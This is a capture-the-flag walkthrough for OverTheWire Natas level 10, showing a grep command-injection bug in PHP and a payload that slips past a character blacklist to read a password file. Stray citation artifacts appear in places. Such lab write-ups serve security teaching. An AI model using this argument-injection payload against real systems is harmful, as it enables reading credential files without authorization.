# OverTheWire Natas Level 10 → 11

## Level Goal

Find the password for Natas Level 11.

## Challenge Overview

The page is almost identical to Natas 9. A search box accepts user input and returns matching entries from a dictionary.

A message on the page states:

```text
For security reasons, we now filter on certain characters
```

Viewing the source reveals the following code:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

## Source Code Analysis

The application still passes user input directly into a shell command:

```bash
grep -i <user_input> dictionary.txt
```

However, a blacklist has been added that blocks:

```text
;
|
&
```

This prevents the exact payload used in Natas 9, but the command injection vulnerability still exists because user input remains inside the command. :contentReference[oaicite:0]{index=0}

## Exploitation

Instead of injecting a second command, we can abuse the way `grep` accepts multiple files.

Payload:

```text
[a-z0-9] /etc/natas_webpass/natas11 #
```

The resulting command becomes:

```bash
grep -i [a-z0-9] /etc/natas_webpass/natas11 # dictionary.txt
```

The password file is now searched directly by grep. Since the password contains alphanumeric characters, grep prints the contents of the file. :contentReference[oaicite:1]{index=1}

## Result

The contents of:

```text
/etc/natas_webpass/natas11
```

are displayed, revealing the password for the next level. :contentReference[oaicite:2]{index=2}

## Vulnerability

This level demonstrates:

- Command Injection
- Blacklist filter bypass
- Improper input validation

## Why the Filter Failed

The developer attempted to block dangerous characters:

```php
preg_match('/[;|&]/',$key)
```

However, blacklists are often incomplete.

Even without executing a second command, the attacker can manipulate the arguments supplied to `grep` and force it to read unintended files. :contentReference[oaicite:3]{index=3}

## Key Takeaway

Blocking a few dangerous characters is not a secure defense.

User input should never be concatenated directly into shell commands.